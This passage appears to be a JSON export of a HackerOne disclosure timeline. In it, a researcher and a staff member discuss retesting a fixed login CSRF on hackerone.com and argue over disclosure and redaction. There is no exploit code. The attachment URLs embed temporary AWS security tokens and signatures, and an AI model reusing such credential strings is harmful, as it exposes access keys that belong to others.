          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/G1wbZAp61FyCwhY66HL7HLu7?response-content-disposition=attachment%3B%20filename%3D%22tes2.PNG%22%3B%20filename%2A%3DUTF-8%27%27tes2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072823Z&X-Amz-Expires=870&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=96f9c033d757500150e67bfe54e9843fd3affd5a6a32705a021812907b4688b8"
        },
        {
          "id": 847013,
          "filename": "test1.PNG",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nXcwnYEmAdyDU6cH3vjK4chf?response-content-disposition=attachment%3B%20filename%3D%22test1.PNG%22%3B%20filename%2A%3DUTF-8%27%27test1.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072823Z&X-Amz-Expires=870&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bd672889a5c956f6aa9bf6c3184e1233e383acc8ee934de39dbaaee43e74c3cb"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8139977,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @what_web - thanks! For the `/current_user.json` request, can you use a `GET` request instead of a `POST` request? The endpoint only implements a `GET` request.",
      "automated_response": false,
      "created_at": "2020-05-29T01:23:13.789Z",
      "updated_at": "2020-05-29T01:23:13.789Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8141538,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I was a high school student, so I couldn't reply because I was in school. I tried GET POST all but failed to attach a picture.\nI could not reproduce everything.\n\nThank you !",
      "automated_response": false,
      "created_at": "2020-05-29T07:13:24.451Z",
      "updated_at": "2020-05-29T07:13:24.451Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8141614,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I will definitely attach the requested photo after testing again as soon as I get home after school.",
      "automated_response": false,
      "created_at": "2020-05-29T07:28:21.676Z",
      "updated_at": "2020-05-29T07:28:21.676Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8143784,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "\n██████\n{F847492}\n{F847493}\n{F847498}\nAgain, the problem can no longer be reproduced. !",
      "automated_response": false,
      "created_at": "2020-05-29T10:59:04.766Z",
      "updated_at": "2020-06-12T17:53:28.854Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 847498,
          "filename": "TEST7.PNG",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/JxDjXxTbMY9hXAKinWj7J8ae?response-content-disposition=attachment%3B%20filename%3D%22TEST7.PNG%22%3B%20filename%2A%3DUTF-8%27%27TEST7.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072823Z&X-Amz-Expires=870&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=92b1a863115a6bb34268a80ada6d86be8d4af5c565ccbe95f3fd2fbb54a44b4d"
        },
        {
          "id": 847493,
          "filename": "TESTJ3.PNG",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/CBKAmbPP1vqUPELJAVP2DcuF?response-content-disposition=attachment%3B%20filename%3D%22TESTJ3.PNG%22%3B%20filename%2A%3DUTF-8%27%27TESTJ3.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072823Z&X-Amz-Expires=870&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a264fe0ca960638e0e4cd53c0b364539f6cc99e664ef4012210f1796af09be62"
        },
        {
          "id": 847492,
          "filename": "TESTH2.PNG",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dM9sCkN8HPU6P1hHQMqskJpT?response-content-disposition=attachment%3B%20filename%3D%22TESTH2.PNG%22%3B%20filename%2A%3DUTF-8%27%27TESTH2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072823Z&X-Amz-Expires=870&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=63ee0950dfbba1d691a6e51ee3e898ebf610fdf9a29c500475d6a3c5181d6a14"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8143794,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@jobert ",
      "automated_response": false,
      "created_at": "2020-05-29T11:00:50.969Z",
      "updated_at": "2020-05-29T11:00:50.969Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8148445,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportRetestApproved",
      "message": "Thanks for retesting, @what_web, it's much appreciated!",
      "automated_response": false,
      "created_at": "2020-05-29T17:30:43.187Z",
      "updated_at": "2020-09-11T11:07:46.707Z",
      "actor": {
        "url": "/security",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "HackerOne"
        }
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8148446,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2020-05-29T17:30:43.313Z",
      "updated_at": "2020-05-29T17:30:43.313Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "reporter": {
        "username": "what_web",
        "url": "/what_web"
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8148471,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-05-29T17:33:07.684Z",
      "updated_at": "2020-05-29T17:33:07.684Z",
      "first_to_agree": true,
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8152825,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "███ █████ ████ ██ █ ██████████ ████████",
      "automated_response": false,
      "created_at": "2020-05-29T23:59:48.058Z",
      "updated_at": "2020-06-12T18:04:01.250Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8152828,
      "is_internal": false,
      "editable": false,
      "type": "Activities::CancelledDisclosureRequest",
      "message": ".",
      "automated_response": false,
      "created_at": "2020-05-30T00:00:17.793Z",
      "updated_at": "2020-05-30T00:00:17.793Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8153306,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "Hi @what_web - thanks, but as per our policy, all confirmed and resolved security vulnerabilities are publicly disclosed:\n\n> We believe in transparency about our security, so any valid vulnerabilities discovered are always publicly disclosed once confirmed and resolved.\n\nCan you help me understand what you're worried about? I'm happy to redact any potentially sensitive information that you don't want to be disclosed. Thanks!",
      "automated_response": false,
      "created_at": "2020-05-30T04:19:30.852Z",
      "updated_at": "2020-05-30T04:19:30.852Z",
      "first_to_agree": true,
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8153380,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████ ████ █████ ██████████ ██ █████ █",
      "automated_response": false,
      "created_at": "2020-05-30T04:41:10.638Z",
      "updated_at": "2020-06-12T18:04:31.672Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8153426,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @what_web -\n\n> Also included in this report is the authenticity_token bypass\n\nLike I explained earlier in the report, this isn't an authenticity token bypass. The impact of the vulnerability is limited to a login CSRF and could not have been used to execute any other action on hackerone.com. We will keep the title the same. Thanks!",
      "automated_response": false,
      "created_at": "2020-05-30T04:47:00.645Z",
      "updated_at": "2020-05-30T04:47:00.645Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8153445,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████ ████ █████ ███",
      "automated_response": false,
      "created_at": "2020-05-30T04:53:52.660Z",
      "updated_at": "2020-06-12T18:04:51.573Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8153692,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████ ████ █████ ██████████ ██ █████ █",
      "automated_response": false,
      "created_at": "2020-05-30T05:26:49.655Z",
      "updated_at": "2020-06-12T18:05:16.997Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8153698,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @what_web - thanks, I'll get back to you early next week about this and redact the report. Right now, we can't modify report contents, but feel free to post it as a Report Summary at the top of the report.",
      "automated_response": false,
      "created_at": "2020-05-30T05:30:23.738Z",
      "updated_at": "2020-05-30T05:30:23.738Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8153723,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thank you @jobert \nIf the content of the report has been completely revised, I would like to disclose it. █████",
      "automated_response": false,
      "created_at": "2020-05-30T05:39:05.768Z",
      "updated_at": "2020-06-12T18:06:01.552Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8260501,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @jobert \n████████\n████\n█████████\n\nThank you.",
      "automated_response": false,
      "created_at": "2020-06-11T08:14:45.409Z",
      "updated_at": "2020-06-23T16:39:38.413Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
